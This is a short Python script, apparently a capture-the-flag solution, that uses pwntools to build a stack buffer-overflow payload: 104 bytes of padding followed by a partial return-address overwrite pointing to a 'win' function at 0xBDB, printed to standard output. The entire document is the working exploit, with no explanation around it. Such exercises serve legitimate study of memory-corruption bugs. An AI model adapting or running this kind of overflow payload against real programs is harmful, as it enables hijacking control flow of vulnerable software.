import sys
from pwn import *
payload = b"A" * 104
win = p16(0xBDB)
payload += win
sys.stdout.buffer.write(payload)
